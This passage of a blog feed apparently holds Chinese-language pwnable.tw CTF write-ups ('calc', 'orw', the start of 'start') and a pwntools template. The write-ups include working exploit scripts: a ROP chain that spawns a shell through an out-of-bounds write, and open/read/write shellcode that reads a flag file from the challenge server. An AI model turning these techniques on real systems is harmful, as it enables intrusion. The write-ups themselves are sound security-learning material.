print(pool[400])</span></span><br><span class="line">-1715908  <span class="comment"># pool[400]</span></span><br><span class="line">+399+123  <span class="comment"># pool[400] = 123 print(pool[399] + 123)</span></span><br><span class="line">123       <span class="comment"># pool[399] + 123</span></span><br><span class="line">+400      <span class="comment"># print(pool[400])</span></span><br><span class="line">123       <span class="comment"># pool[400]</span></span><br></pre></td></tr></table></figure></div><h3 id="結論正確！"><a href="#結論正確！" class="headerlink" title="結論正確！"></a>結論正確！</h3><h2 id="0x4-Exploitation"><a href="#0x4-Exploitation" class="headerlink" title="0x4 Exploitation"></a>0x4 Exploitation</h2><p>我們已經可以做到任意的 oob write &amp; read 了，再來就是找 ret 跟 pool 的相對位置：<br>在 ida 有很貼心的幫我們標示 <code>pool[]</code> 的位置：<br><code>int pool[101]; // [esp+18h] [ebp-5A0h] BYREF</code><br>又 <code>cal()</code> 的 ret 在 ebp + 0x4，<br>0x5A0 + 0x4 &#x3D; 0x5A4 &#x2F; 4 &#x3D; 361<br>所以 ret 在 <code>pool[361]</code> 的位置。<br>那最一開始有提到這題有開 NX 不能直接寫 shellcode，但因為是 statically linked，所以我會想先嘗試 rop 開 shell。<br>我們還需要知道 main_ebp 的位置，因為這題找不到 “\bin\sh”，所以我們要自己填再跳上去，因此會需要 leak main_ebp。<br>那 leak 的方式也很簡單，因為 pool[360] 就是存 main_ebp 所以可以透過輸入 +360 來獲得。<br>等等會直接把 <code>/bin/sh</code> 放在 <code>in 0x80</code> 後面，所以把 stack frame 用 gdb 釐清一下，進到 <code>calc()</code> 後印出 <code>$ebp</code>：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x <span class="variable">$ebp</span></span><br><span class="line">0xffffd278:     0xffffd298</span><br></pre></td></tr></table></figure></div><p>所以可以得知 calc_ebp 到 main_ebp 的距離為 0x20。<br>來用表格呈現一下我們的 ROP chain：</p><table><thead><tr><th align="center">Stack</th><th align="center">pool</th><th align="center">value</th><th align="center">Note</th></tr></thead><tbody><tr><td align="center">calc_ebp</td><td align="center">pool[360]</td><td align="center">main_ebp</td><td align="center"></td></tr><tr><td align="center">calc_ret</td><td align="center">pool[361]</td><td align="center">0x0805c34b</td><td align="center">pop_eax</td></tr><tr><td align="center">main_ebp-0x18</td><td align="center">pool[362]</td><td align="center">0x0b</td><td align="center">11</td></tr><tr><td align="center">main_ebp-0x14</td><td align="center">pool[363]</td><td align="center">0x080701d0</td><td align="center">pop_edx_ecx_ebx</td></tr><tr><td align="center">main_ebp-0x10</td><td align="center">pool[364]</td><td align="center">0x0</td><td align="center"></td></tr><tr><td align="center">main_ebp-0xc</td><td align="center">pool[365]</td><td align="center">0x0</td><td align="center"></td></tr><tr><td align="center">main_ebp-0x8</td><td align="center">pool[366]</td><td align="center">main_ebp</td><td align="center">bin_sh_addr</td></tr><tr><td align="center">main_ebp-0x4</td><td align="center">pool[367]</td><td align="center">0x08049a21</td><td align="center">int 0x80</td></tr><tr><td align="center">main_ebp</td><td align="center">pool[368]</td><td align="center">u32(“&#x2F;bin”)</td><td align="center"></td></tr><tr><td align="center">main_ret</td><td align="center">pool[369]</td><td align="center">u32(“&#x2F;sh\0”)</td><td align="center"></td></tr></tbody></table><p>填的時候要注意不能單獨出現 0，所以我們可以利用 +x+y 會把 pool[x] &#x3D; pool[x] + y 的特性來放置我們的 rop，就可以避免跳 <code>prevent division by zero</code> 的錯誤。</p><h2 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./calc&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10100</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;+360&quot;</span>)</span><br><span class="line">main_ebp = <span class="built_in">int</span>(r.recv())</span><br><span class="line">success(<span class="string">&quot;main_ebp: %s&quot;</span> % <span class="built_in">hex</span>(main_ebp))</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x080701d0</span></span><br><span class="line">int_0x80 = <span class="number">0x08049a21</span></span><br><span class="line"></span><br><span class="line">rop = [pop_eax, <span class="number">0x0b</span>, pop_edx_ecx_ebx, <span class="number">0x0</span>, <span class="number">0x0</span>, main_ebp, int_0x80, u32(<span class="string">&quot;/bin&quot;</span>), u32(<span class="string">&quot;/sh\0&quot;</span>)]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">361</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rop:</span><br><span class="line">    payload = <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    temp = <span class="built_in">int</span>(r.recv())</span><br><span class="line">    temp = i - temp</span><br><span class="line">    <span class="keyword">if</span> temp &gt;= <span class="number">0</span>:</span><br><span class="line">        payload += <span class="string">&#x27;+&#x27;</span> + <span class="built_in">str</span>(temp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += <span class="built_in">str</span>(temp)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv()</span><br><span class="line">    offset += <span class="number">1</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10100: Done</span><br><span class="line">[+] main_ebp: -0x510cf8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">cat</span> /home/calc/flag</span><br><span class="line">FLAG&#123;??????????????????&#125;</span><br></pre></td></tr></table></figure></div><h2 id="0x6-References"><a href="#0x6-References" class="headerlink" title="0x6 References"></a>0x6 References</h2><p>一開始做的時候忽略 <code>eval()</code> 最後有個 <code>--*pool;</code>導致一直計算錯誤QQ。<br>這題寫了蠻久的，參考了很多大佬的 writeup，學到好多東西，未來應該也會用表格和拆解程式碼來輔助釐清思緒。<br><a class="link"   href="https://hackmd.io/@Zero871015/pwnable#calc" >https://hackmd.io/@Zero871015/pwnable#calc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/01/calc/" >https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/01/calc/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/weixin_46521144/article/details/118543069" >https://blog.csdn.net/weixin_46521144/article/details/118543069 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-calc&quot;&gt;&lt;a href=&quot;#Pwnable-tw-calc&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - calc&quot;&gt;&lt;/a&gt;Pwnable.tw - calc&lt;/h1&gt;&lt;h3 id=&quot;Descripti</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
    
    <category term="oob" scheme="https://kazma.tw/tags/oob/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
  </entry>
  
  <entry>
    <title>Notes for Pwn</title>
    <link href="https://kazma.tw/2024/02/11/Note-for-Pwn/"/>
    <id>https://kazma.tw/2024/02/11/Note-for-Pwn/</id>
    <published>2024-02-11T07:24:06.000Z</published>
    <updated>2024-02-11T07:48:10.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Notes-for-Pwn"><a href="#Notes-for-Pwn" class="headerlink" title="Notes for Pwn"></a>Notes for Pwn</h1><p>整理一些常用的腳本和工具。</p><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">DEBUG_MODE = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setgdb</span>(<span class="params">filename : <span class="built_in">str</span></span>):</span><br><span class="line">    r = process(filename)</span><br><span class="line">    context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(DEBUG_MODE):</span><br><span class="line">        r = setgdb(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;&quot;</span>, )</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Notes-for-Pwn&quot;&gt;&lt;a href=&quot;#Notes-for-Pwn&quot; class=&quot;headerlink&quot; title=&quot;Notes for Pwn&quot;&gt;&lt;/a&gt;Notes for Pwn&lt;/h1&gt;&lt;p&gt;整理一些常用的腳本和工具。&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw orw Writeup</title>
    <link href="https://kazma.tw/2024/02/07/Pwnable-tw-orw-Writeup/"/>
    <id>https://kazma.tw/2024/02/07/Pwnable-tw-orw-Writeup/</id>
    <published>2024-02-07T08:40:36.000Z</published>
    <updated>2024-02-16T07:57:33.657Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-orw"><a href="#Pwnable-tw-orw" class="headerlink" title="Pwnable.tw - orw"></a>Pwnable.tw - orw</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Read the flag from &#x2F;home&#x2F;orw&#x2F;flag.<br>Only open read write syscall are allowed to use.</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#2" >https://pwnable.tw/challenge/#2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>一樣先觀察這題的一些基本資訊。</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file orw</span><br><span class="line">orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec orw</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/orw/orw&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><h3 id="orw"><a href="#orw" class="headerlink" title=".&#x2F;orw"></a>.&#x2F;orw</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./orw</span><br><span class="line">Give my your shellcode:1234</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure></div><h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  <span class="keyword">if</span> (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  <span class="keyword">if</span> (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  <span class="keyword">if</span> (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  <span class="keyword">if</span> (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  <span class="keyword">if</span> (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  <span class="keyword">if</span> (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  <span class="built_in">return</span> ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure></div><h3 id="disassemble-main"><a href="#disassemble-main" class="headerlink" title="disassemble main"></a>disassemble main</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x08048548 &lt;+0&gt;:     lea    ecx,[esp+0x4]</span><br><span class="line">   0x0804854c &lt;+4&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x0804854f &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048552 &lt;+10&gt;:    push   ebp</span><br><span class="line">   0x08048553 &lt;+11&gt;:    mov    ebp,esp</span><br><span class="line">   0x08048555 &lt;+13&gt;:    push   ecx</span><br><span class="line">   0x08048556 &lt;+14&gt;:    sub    esp,0x4</span><br><span class="line">   0x08048559 &lt;+17&gt;:    call   0x80484cb &lt;orw_seccomp&gt;</span><br><span class="line">   0x0804855e &lt;+22&gt;:    sub    esp,0xc</span><br><span class="line">   0x08048561 &lt;+25&gt;:    push   0x80486a0</span><br><span class="line">   0x08048566 &lt;+30&gt;:    call   0x8048380 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x0804856b &lt;+35&gt;:    add    esp,0x10</span><br><span class="line">   0x0804856e &lt;+38&gt;:    sub    esp,0x4</span><br><span class="line">   0x08048571 &lt;+41&gt;:    push   0xc8</span><br><span class="line">   0x08048576 &lt;+46&gt;:    push   0x804a060</span><br><span class="line">   0x0804857b &lt;+51&gt;:    push   0x0</span><br><span class="line">   0x0804857d &lt;+53&gt;:    call   0x8048370 &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">   0x08048582 &lt;+58&gt;:    add    esp,0x10</span><br><span class="line">   0x08048585 &lt;+61&gt;:    mov    eax,0x804a060</span><br><span class="line">   0x0804858a &lt;+66&gt;:    call   eax</span><br><span class="line">   0x0804858c &lt;+68&gt;:    mov    eax,0x0</span><br><span class="line">   0x08048591 &lt;+73&gt;:    mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08048594 &lt;+76&gt;:    leave</span><br><span class="line">   0x08048595 &lt;+77&gt;:    lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048598 &lt;+80&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div><h3 id="0x2-Exploitation"><a href="#0x2-Exploitation" class="headerlink" title="0x2 Exploitation"></a>0x2 Exploitation</h3><p>題目描述說只能使用 open read write，從 seccomp-tools 也能確認這個限制，逆向分析會發現就是很單純的把我們給的 shellcode 拿去執行而已，好像也沒什麼好解釋的，那就直接上 exploit XD。</p><h3 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./orw&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(</span><br><span class="line">    shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">b&#x27;/home/orw/flag&#x27;</span>) +</span><br><span class="line">    shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>) +</span><br><span class="line">    shellcraft.i386.linux.write(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;:&#x27;</span>, sc)</span><br><span class="line">flag = r.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">success(<span class="string">&#x27;Flag: %s&#x27;</span> % flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>Result：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port 10001: Done</span><br><span class="line">[+] Flag: b<span class="string">&#x27;FLAG&#123;?????????????????????????&#125;&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure></div><h2 id="0x5-References"><a href="#0x5-References" class="headerlink" title="0x5 References"></a>0x5 References</h2><p>可以參考張元在 edu-ctf 上的 how2orw，下面附上影片連結和 writeup：<br><a class="link"   href="https://www.youtube.com/watch?v=U8N6aE-Nq-Q" >https://www.youtube.com/watch?v=U8N6aE-Nq-Q <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a href="https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/">https://kazma.tw/2023/12/10/Yuawn-Pwn1-orw-Writeup/</a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-orw&quot;&gt;&lt;a href=&quot;#Pwnable-tw-orw&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - orw&quot;&gt;&lt;/a&gt;Pwnable.tw - orw&lt;/h1&gt;&lt;h3 id=&quot;Description&quot;&gt;</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
    <category term="orw" scheme="https://kazma.tw/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw start Writeup</title>
    <link href="https://kazma.tw/2024/02/07/Pwnable-tw-start-Writeup/"/>
    <id>https://kazma.tw/2024/02/07/Pwnable-tw-start-Writeup/</id>
    <published>2024-02-06T17:46:25.000Z</published>
    <updated>2024-02-16T07:57:12.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-start"><a href="#Pwnable-tw-start" class="headerlink" title="Pwnable.tw - start"></a>Pwnable.tw - start</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Just a start.</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#1" >https://pwnable.tw/challenge/#1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>首先觀察這題的一些基本資訊可以發現這題是 x86 的 binary，然後保護機制都沒開。沒有 main ，代表很有可能是直接用組語手刻的。gdb 反組譯 _start 之後也會發現指令確實很少。</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file start</span><br><span class="line">start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec start</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/start/start&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div><h3 id="start"><a href="#start" class="headerlink" title=".&#x2F;start"></a>.&#x2F;start</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./start</span><br><span class="line">Let<span class="string">&#x27;s start the CTF:123</span></span><br></pre></td></tr></table></figure></div><h3 id="disassemble"><a href="#disassemble" class="headerlink" title="disassemble"></a>disassemble</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info <span class="keyword">function</span></span><br><span class="line">All defined <span class="built_in">functions</span>:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08048060  _start</span><br><span class="line">0x0804809d  _exit</span><br><span class="line">0x080490a3  __bss_start</span><br><span class="line">0x080490a3  _edata</span><br><span class="line">0x080490a4  _end</span><br><span class="line">0xf7ffc580  __kernel_vsyscall</span><br><span class="line">0xf7ffc5a0  __kernel_sigreturn</span><br><span class="line">0xf7ffc5b0  __kernel_rt_sigreturn</span><br><span class="line">0xf7ffc7a0  __vdso_gettimeofday</span><br><span class="line">0xf7ffcb50  __vdso_time</span><br><span class="line">0xf7ffcba0  __vdso_clock_gettime</span><br><span class="line">0xf7ffd060  __vdso_clock_gettime64</span><br><span class="line">0xf7ffd560  __vdso_clock_getres</span><br><span class="line">0xf7ffd5f0  __vdso_getcpu</span><br><span class="line">gef➤  disassemble _start</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> _start:</span><br><span class="line">=&gt; 0x08048060 &lt;+0&gt;:     push   esp</span><br><span class="line">   0x08048061 &lt;+1&gt;:     push   0x804809d</span><br><span class="line">   0x08048066 &lt;+6&gt;:     xor    eax,eax</span><br><span class="line">   0x08048068 &lt;+8&gt;:     xor    ebx,ebx</span><br><span class="line">   0x0804806a &lt;+10&gt;:    xor    ecx,ecx</span><br><span class="line">   0x0804806c &lt;+12&gt;:    xor    edx,edx</span><br><span class="line">   0x0804806e &lt;+14&gt;:    push   0x3a465443</span><br><span 